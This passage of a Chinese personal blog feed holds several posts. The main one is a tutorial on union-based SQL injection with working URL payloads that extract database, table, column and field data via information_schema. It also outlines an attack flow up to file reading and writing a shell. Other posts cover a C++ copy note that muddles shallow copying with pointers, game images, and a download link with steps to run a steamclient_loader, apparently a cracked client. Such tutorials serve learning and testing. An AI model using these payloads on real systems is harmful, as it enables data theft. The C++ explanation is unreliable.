table时，网页中显示了信息8<br>那么说明网页只能够显示第8列中信息，不能显示其他列的信息。<br>也可以理解为网页只开放了8这个窗口，你想要查询数据库信息就必须要通过这个窗口。<br>所以如果我们想要知道某个属性的值，比如admin；<br>就要把admin属性放到8的位置上，这样就能通过第8列爆出admin的信息。<br>但是为了爆出第一位后面的显示位需要隐藏正常结果<br>比如将id=1改为id=-1，使union前面的语句报错，执行后面的，爆出显示位</p><p>5、利用显示位获取库名</p><pre><code>select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</code></pre><p>在高版本中查询该表就行，具体看上一篇文章。<br>group_concat()函数将所有查询的库名连在一起成为一条数据</p><pre><code>?id=-1&#39; union select 1,database(),3 --+</code></pre><p>假设判断出在2号位显示，那么在二号位换成想插入的SQL语句就行了。<br>相同的，这里也要让union前面的语句报错，执行后面的。</p><p>6、获取表名</p><pre><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;库名&#39; --+</code></pre><p>相同的，这里也要让union前面的语句报错，执行后面的。<br>group_concat()函数将所有查询的表名连在一起成为一条数据</p><p>7、查询表中列名</p><pre><code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; --+</code></pre><p>数据库有个information_schema库，里面有个columns表，存有整个数据库的列名。<br>我们要去查找的列，就是在这个库中去找。</p><p>8、获取字段信息</p><pre><code>?id=-1’ union select 1,group_concat(列名),3 from 库名.表名 --+</code></pre><p>平平无奇，跟上面的没啥不同，等价于下面这条</p><pre><code>?id=-1’ union select 1,列名,3 from 库名.表名 limit 0,1 --+</code></pre><h4 id="联合查询注入是最简单的了，一定要完全看懂"><a href="#联合查询注入是最简单的了，一定要完全看懂" class="headerlink" title="联合查询注入是最简单的了，一定要完全看懂"></a>联合查询注入是最简单的了，一定要完全看懂</h4><h3 id="黑盒，白盒，灰盒测试"><a href="#黑盒，白盒，灰盒测试" class="headerlink" title="黑盒，白盒，灰盒测试"></a>黑盒，白盒，灰盒测试</h3><h4 id="黑盒测试（测试功能）"><a href="#黑盒测试（测试功能）" class="headerlink" title="黑盒测试（测试功能）"></a>黑盒测试（测试功能）</h4><p>黑盒测试是以用户的角度，从输入数据与输出数据的对应关系出发进行测试的。<br>目的是检测程序是否能适当地接收输入数据而产生正确的输出信息。<br>很明显，如果外部特性本身设计有问题或规格说明的规定有误，用黑盒测试方法是发现不了的。</p><h4 id="白盒测试（优化程序）"><a href="#白盒测试（优化程序）" class="headerlink" title="白盒测试（优化程序）"></a>白盒测试（优化程序）</h4><p>以开发者的角度，对程序内部细节的严密检验</p><h4 id="灰盒测试（修复bug）"><a href="#灰盒测试（修复bug）" class="headerlink" title="灰盒测试（修复bug）"></a>灰盒测试（修复bug）</h4><p>多用于集成测试阶段，不仅关注输出、输入的正确性，同时也关注程序内部的情况。<br>灰盒测试不像白盒那样详细、完整，但又比黑盒测试更关注程序的内部逻辑。<br>常常是通过一些表征性的现象、事件、标志来判断内部的运行状态。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;SQL联合注入&quot;&gt;&lt;a href=&quot;#SQL联合注入&quot; class=&quot;headerlink&quot; title=&quot;SQL联合注入&quot;&gt;&lt;/a&gt;SQL联合注入&lt;/h3&gt;&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入前置知识及注入原理</title>
    <link href="https://liu1272.github.io/2023/03/11/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
    <id>https://liu1272.github.io/2023/03/11/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</id>
    <published>2023-03-11T15:09:00.000Z</published>
    <updated>2023-03-12T04:17:35.174Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>BurpSuite的及其拓展的安装及使用<br>SQLmap的下载及基本命令<br>了解少许PHP语言<br><strong>不断尝试的热情！</strong>                    </p><h4 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h4><h5 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h5><p>由于SQL语言是结构化查询语言(是操作数据库的语言,不懂的自己找我之前的文章)可以据库进行增、删、改、查等操作。<br>又因为程序员写的PHP代码不严谨，导致访问提交数据时，我们可以把代码提交到后台数据库，后台数据库处理这些数据时这些数据插入或拼接在一起形成了SQL语句命令，最后这个SQL语句可以被后台数据库作为恶意代码执行，从而达到你想达到的注入效果。</p><h5 id="SQL注入三要素"><a href="#SQL注入三要素" class="headerlink" title="SQL注入三要素"></a>SQL注入三要素</h5><p><em><strong>未严格过滤（没开waf等防护）<br>允许恶意修改（具有一定权限）<br>执行语句（能够闭合并执行的合法SQL语句）</strong></em></p><h5 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h5><p>按照注入时的表现来区分:<br>boolean-based blind – 布尔盲注<br>error-based – 报错注入<br>time-base blind – 延时注入<br>UNION query – 联合查询注入<br>堆叠查询注入</p><p>按照注入点区分:<br>字符型<br>数字型</p><p>按照提交数据方式来区分:<br>GET注入<br>POST注入<br>Cookie注入<br>HTTP头部注入</p><h5 id="注入测试一般流程"><a href="#注入测试一般流程" class="headerlink" title="注入测试一般流程"></a>注入测试一般流程</h5><pre><code>(1)寻找注入点:可通过web扫描工具实现；        是否存在注入并且判断注入类型(2)利用注入点:尝试通过注入获得各种信息，越多越好；(3)数据处理:猜解关键数据库表及其重要字段与内容；        猜解SQL查询语句的字段数        确定回显点        查询数据库信息        查询用户名，数据库名(4)后续攻击:通过获取的用户信息，寻找后台登录并利用后台或了解的进一步信息。        文件读取        写入shell</code></pre><h4 id="一些杂七杂八的拓展知识"><a href="#一些杂七杂八的拓展知识" class="headerlink" title="一些杂七杂八的拓展知识"></a>一些杂七杂八的拓展知识</h4><pre><code>在MySQL5.0版本以后MySQL数据库中会默认存放一个information_schema的数据库，在该数据库中，我们需要记住三个表名，分别是schemata，tables，columns。schemata表字段schema_name记录着数据库的库名；tables表字段table_schema和table_nmae分别记录着数据库中的库名和表名；columns表字段table_schema和table_name以及columns_name分别记录着数据库的库名、表名、字段名；select 原始查询内容 union select 构造的内容两者下一级的个数必须保持一致select * from order by 你要按照排序的对象对MySQL中查询结果按照指定字段名进行排序，左边第一个字段对应的索引是 1limit 一个一个打印出来group_concat 一次性全部打印group_concat()函数将同一组的列显示出来，相当于爆出该数据库的全部表concat_ws(分隔符，str1，str2，……)函数同时显示多个字段，并以分隔符分开concat(str1，str2，str3，…)函数同时显示多个字段，其中有一个字段为null，则返回nullSQL语句结尾加上limit 0,1表示一个一个输出前面的语句的结果0x20是空格常用函数:length()                # 返回字符串的长度substring()                        substr()                # 截取字符串mid()left()                    # 从左侧开始取指定字符个数的字符串concat()                    # 没有分隔符的连接字符串concat_ws()              # 含有分割符的连接字符串group_conat()           # 连接一个组的字符串ord()                    # 返回ASCII 码ascii()    hex()                    # 将字符串转换为十六进制unhex()                    # hex 的反向操作md5()                    # 返回MD5 值floor(x)                # 返回不大于x 的最大整数round()                    # 返回参数x 接近的整数rand()                    # 返回0-1 之间的随机浮点数load_file()                # 读取文件，并返回文件内容作为一个字符串sleep()                    # 睡眠时间为指定的秒数if(true,t,f)            # if 判断find_in_set()            # 返回字符串在字符串列表中的位置benchmark()                # 指定语句执行的次数</code></pre><h4 id="较难理解的注释语句"><a href="#较难理解的注释语句" class="headerlink" title="较难理解的注释语句"></a>较难理解的注释语句</h4><pre><code>#和-- 表示注释，可以使它们后面的语句不被执行(--后有个空格)get请求解释执行的时候，url中#号是锚点，所以HTTP请求中使用#闭合无法注释。而-- 在传输过程中--与后面的单引号连接在一起，也无法形成有效的mysql语句。那么要启动空格的作用就需要在--后面加上一点字符，比如+或&#39;(因为+会被解释成空格)当然，也可以使用--%20，把空格转换为urlencode编码格式，也不会报错。同理把#变成%23,也不报错。如果是post请求，则可以直接使用#来进行闭合。常见的就是表单注入，如在后台登录框中进行注入。另外#后面可以有空格，也可以没有(sql就是这么规定的，记住就行了)</code></pre><h5 id="最后哔哔一句，如果你丫这都看不懂，那你别学了。"><a href="#最后哔哔一句，如果你丫这都看不懂，那你别学了。" class="headerlink" title="最后哔哔一句，如果你丫这都看不懂，那你别学了。"></a>最后哔哔一句，如果你丫这都看不懂，那你别学了。</h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot; class=&quot;headerlink&quot; title=&quot;前置知识&quot;&gt;&lt;/a&gt;前置知识&lt;/h4&gt;&lt;p&gt;BurpSuite的及其拓展的安装及使用&lt;br&gt;SQLmap的下载及基本命令&lt;br&gt;了解少许PHP语言&lt;br&gt;&lt;strong</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>拷贝相关</title>
    <link href="https://liu1272.github.io/2023/03/09/%E6%8B%B7%E8%B4%9D%E7%9B%B8%E5%85%B3/"/>
    <id>https://liu1272.github.io/2023/03/09/%E6%8B%B7%E8%B4%9D%E7%9B%B8%E5%85%B3/</id>
    <published>2023-03-09T14:49:00.000Z</published>
    <updated>2023-03-09T15:04:25.321Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h5 id="本篇文章简要记录一下C-拷贝相关的知识以及误区。"><a href="#本篇文章简要记录一下C-拷贝相关的知识以及误区。" class="headerlink" title="本篇文章简要记录一下C++拷贝相关的知识以及误区。"></a>本篇文章简要记录一下C++拷贝相关的知识以及误区。</h5><p>   <strong>首先上定义:</strong><br>   拷贝和浅拷贝是指在对对象一份复制或者复制某些部分时所表现出来的差异。</p><p>   浅拷贝只复制对象的引用，由于是引用，所以当拷贝对象中的属性变化时，原始对象和拷贝对象共享这些属性的变化，也就是说，拷贝对象的属性变化会影响到原始对象的属性。因为是浅拷贝，所以拷贝的对象和原来的对象不是两个的独立存在，而是共享数据存储空间。</p><p>   深拷贝则是在复制对象的指针引用的同时，完全复制一份内容相同的对象。也就是说，深度拷贝会创建一个新的对象，而不仅仅是拷贝其指针引用，因此，它们的变化互不影响。人们可以自由操作两个对象，而不会对另一个产生影响。因此，深拷贝能够完整地承载原对象所有信息。这个复制后的对象与原对象彻底分离，内存空间也不同了。</p><p>   简单地说:浅拷贝会影响原有的数据，相当于做了路径引用；深拷贝是另外开辟了内存空间，相当于复制了一个。</p><p>   <strong>然后是一个比较大的误区(可能是我比较菜所以搞不懂):</strong><br>   使用指针传递值是浅拷贝。</p><p>   当使用指针传递值时，函数参数传递的是指针所指向的内存地址，而不是实际的变量本身。因此，函数内部对于指针所指向的数据进行的操作，会直接影响到原始数据，属于浅拷贝。</p><p>   如果需要进行深拷贝，可以使用其他方式，比如使用引用传递或者复制构造函数等。</p><p><strong>上代码才看得懂！</strong></p><pre class="line-numbers language-c++"><code class="language-c++">指针可以直接访问和修改原数据的地址，从而实现更改原数据。具体操作步骤如下：1. 定义指针变量并初始化为原数据的地址：int data = 10;int* pData = &data;2. 通过指针访问和修改原数据：*pData = 20;  // 将原数据修改为20完整示例代码如下：#include <iostream>using namespace std;int main() &#123;    int data = 10;    int* pData = &data;    cout << "原数据：" << data << endl;    *pData = 20;    cout << "更改后的数据：" << data << endl;    return 0;&#125;输出结果为：原数据：10更改后的数据：20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="今天就这么多，写作业去了。"><a href="#今天就这么多，写作业去了。" class="headerlink" title="今天就这么多，写作业去了。"></a>今天就这么多，写作业去了。</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h5 id=&quot;本篇文章简要记录一下C-拷贝相关的知识以及误区。&quot;&gt;&lt;a href=&quot;#本篇文章简要记录一下C-拷贝相关的知识以及</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Arcaea</title>
    <link href="https://liu1272.github.io/2023/03/08/Arcaea/"/>
    <id>https://liu1272.github.io/2023/03/08/Arcaea/</id>
    <published>2023-03-07T16:05:00.000Z</published>
    <updated>2023-03-08T16:13:09.309Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Final-Verdict"><a href="#Final-Verdict" class="headerlink" title="Final Verdict"></a>Final Verdict</h3><p><img src="https://s2.loli.net/2023/03/09/hOT6eWV85gIwX1j.jpg" alt="第一个必须得是咲弥！"><br><img src="https://s2.loli.net/2023/03/09/NKS61Q3PV8spoIL.jpg" alt="光光怎么哭了呜呜呜"><br><img src="https://s2.loli.net/2023/03/09/zNcPyYS5qmhxXnR.jpg" alt="我可怜的光光"><br><img src="https://s2.loli.net/2023/03/09/gHa1KlTMLGfrCsx.jpg" alt="牵着我的手"><br><img src="https://s2.loli.net/2023/03/09/g6T9YwRuFqBNoHL.jpg" alt="目视崩溃的未来"><br><img src="https://s2.loli.net/2023/03/08/1SqIAni59T7bZ8y.png" alt="贴贴"><br><img src="https://s2.loli.net/2023/03/08/dU8i4P1BxQuTSCt.png" alt="Arcaea的残骸"><br><img src="https://s2.loli.net/2023/03/08/QGgLYvEh7TeakJI.png"><br><img src="https://s2.loli.net/2023/03/08/4ki3oUOtQI2FyRn.png"><br><img src="https://s2.loli.net/2023/03/08/cCpUPTDjX4KLrHi.png" alt="尾声"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Final-Verdict&quot;&gt;&lt;a href=&quot;#Final-Verdict&quot; class=&quot;headerlink&quot; title=&quot;Final Verdict&quot;&gt;&lt;/a&gt;Final Verdict&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://s2.loli.</summary>
      
    
    
    
    <category term="图片" scheme="https://liu1272.github.io/categories/%E5%9B%BE%E7%89%87/"/>
    
    
    <category term="图片" scheme="https://liu1272.github.io/tags/%E5%9B%BE%E7%89%87/"/>
    
  </entry>
  
  <entry>
    <title>喵斯？快跑！</title>
    <link href="https://liu1272.github.io/2023/03/05/%E5%96%B5%E6%96%AF%E5%BF%AB%E8%B7%91%EF%BC%81/"/>
    <id>https://liu1272.github.io/2023/03/05/%E5%96%B5%E6%96%AF%E5%BF%AB%E8%B7%91%EF%BC%81/</id>
    <published>2023-03-04T17:39:00.000Z</published>
    <updated>2023-03-04T18:24:17.353Z</updated>
    
    <content type="html"><![CDATA[<h5 id="这篇文章就是来吐槽musedash的！"><a href="#这篇文章就是来吐槽musedash的！" class="headerlink" title="这篇文章就是来吐槽musedash的！"></a>这篇文章就是来吐槽musedash的！</h5><p>该死的喵斯，你单单靠自己频繁的联动是注定无法长久地保存音游圈的流量的！<br>首先，那个该死的只能228软妹币一次性买断的曲包机制，<br>以及在各个平台的同一账号购买记录不互通就足够烦恼了。<br>然后，更难受的还得是资源封锁。<br>人家Phigros和Arcaea都有各自在民间广泛流传的自制谱渠道。<br>燃鹅你游官方不给就算了，还任由某个小团体封锁自制的资源。<br>甚至有考核乐理和游戏排行来决定玩家是否能够拥有写谱的资格。<br><strong>对此我只能说是离谱至极！</strong><br>自制铺面本应是趁兴而为。<br>但是，我为了导入一首I Got Smoke不得不加了三个喵斯群，一个考核群。<br>最后还是自己花了6个小时在互联网上找到各方零散资源，<br>再自行尝试修改才成功的。<br>如此可见，如果一个热爱喵斯而实力不强的玩家遇到这种情况，<br>那么将会是一盆冷水浇个透心凉！</p><p>下面的图你们自己看看吧。<br><img src="https://s2.loli.net/2023/03/05/fhio3NYLdr8bFHt.png" alt="载入mdmc"><br><img src="https://s2.loli.net/2023/03/05/Esnuw7XrcQkVjAq.png" alt="最后有折磨多"><br><img src="https://s2.loli.net/2023/03/05/f1KrcBpDX65T7Ow.png" alt="终于搞定了"></p><p>这里是阿里云盘的<a href="https://www.aliyundrive.com/s/UqrJ8R732JC">分享链接</a>，提取码是4qt8</p><p>下面是使用教程:<br>1.“下崽”并解压至没有中文的路径比如桌面(问为什么的找GPT去)<br>2.双击MuseDash文件夹里的那个steamclient_loader文件<br>3.千万不要点MuseDash这个应用程序(你爱试就逝咯)<br>4.如果成功运行，按Q找西瓜图标的自定义包就行了<br>5.如果卡了或命令行卡在下载某个zip文件那就Ctrl+C一下<br>6.实在不行就双击解压出来的另一个文件，选择MuseDash这个应用程序然后漫长等待。<br>7.上一步需要科学上网<br>8.如果按上面做都不行就去该博客GitHub仓库找我。</p><h5 id="不写每日一句了，下午还有个会议，晚上有晚自习。早点睡了。"><a href="#不写每日一句了，下午还有个会议，晚上有晚自习。早点睡了。" class="headerlink" title="不写每日一句了，下午还有个会议，晚上有晚自习。早点睡了。"></a>不写每日一句了，下午还有个会议，晚上有晚自习。早点睡了。</h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;这篇文章就是来吐槽musedash的！&quot;&gt;&lt;a href=&quot;#这篇文章就是来吐槽musedash的！&quot; class=&quot;headerlink&quot; title=&quot;这篇文章就是来吐槽musedash的！&quot;&gt;&lt;/a&gt;这篇文章就是来吐槽musedash的！&lt;/h5&gt;&lt;p&gt;该死</summary>
      
    
    
    
    <category term="资源" scheme="https://liu1272.github.io/categories/%E8%B5%84%E6%BA%90/"/>
    
    
    <category term="资源" scheme="https://liu1272.github.io/tags/%E8%B5%84%E6%BA%90/"/>
    
  </entry>
  
</feed>
